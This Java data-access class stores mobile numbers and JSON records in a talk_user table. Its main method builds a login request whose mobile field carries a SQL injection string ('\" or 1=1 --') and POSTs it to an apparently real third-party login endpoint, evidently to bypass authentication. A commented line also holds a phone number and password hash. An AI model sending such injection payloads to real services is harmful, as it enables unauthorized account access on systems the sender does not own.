package com.zhanghao.dao.impl;

import com.zhanghao.dao.Talk51Dao;
import com.zhanghao.domain.TalkData;
import com.zhanghao.jdbc.JDBCHelper;
import com.zhanghao.program1.Talk51Data;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by Administrator on 2018/9/19/019.
 */
public class Talk51DaoImpl implements Talk51Dao {
    JDBCHelper jdbcHelper =JDBCHelper.getInstance();
    public void insertMoblie(List<TalkData> list) {
        List<Object[]> objs = new ArrayList<Object[]>();
        String sql = "replace into talk_user values (?,?)";
        for(TalkData str : list){
            Object[] obj =new Object[]{str.getMobile(),str.getJson()};
            objs.add(obj);
        }
        jdbcHelper.executeBatch(sql,objs);
    }

    public void insert(TalkData data) {
        String sql = "replace into talk_user values (?,?)";
        Object[] obj =new Object[]{data.getMobile(),data.getJson()};
        jdbcHelper.executeUpdate(sql, obj);
    }

    public static void main(String[] args){
//        Talk51Dao dao =new Talk51DaoImpl();
//        List<String>  list = new ArrayList<String>();
//        list.add("aaa");
//        list.add("aab");
//        System.out.println(list.size());
//        list.clear();
//        System.out.println(list.size());

//        dao.insertMoblie(list);
        //String param= "mobile=18317153110&password=593c9b4a9390551d53e5cacf28ebd638";
        String param ="{\"mobile\":\" \\\" or 1=1  --  \",\"password\":\"851e7c85cfdff4c91b196e4b0db77e97\"}";
//        try {
//            JSONObject obj =new JSONObject(param);
//            System.out.println(obj.get("mobile"));
//        } catch (JSONException e) {
//            e.printStackTrace();
//        }

        System.out.println(param);
        try {
            String str = Talk51Data.load("https://mk.zhimo.co/zhimo/mobile/login.json", "POST", param);
            System.out.println(str);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
